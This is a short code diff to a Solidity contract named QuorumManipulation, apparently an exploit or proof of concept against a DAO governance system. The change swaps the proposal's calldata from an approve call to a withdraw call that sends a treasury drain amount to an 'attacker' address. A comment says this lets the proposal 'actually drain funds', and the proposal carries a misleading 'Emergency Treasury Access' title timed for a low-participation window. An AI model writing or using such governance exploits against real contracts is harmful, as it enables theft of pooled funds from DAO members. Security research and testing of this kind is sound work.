@@ -138,7 +138,8 @@ contract QuorumManipulation {
         values[0] = 0;
 
         bytes[] memory calldatas = new bytes[](1);
-        calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", attacker, treasuryDrainAmount);
+        // Use a treasury withdrawal method so the proposal can actually drain funds
+        calldatas[0] = abi.encodeWithSignature("withdraw(address,uint256)", attacker, treasuryDrainAmount);
 
         string memory description = "PROPOSAL: Emergency Treasury Access - Low Participation Window";
 
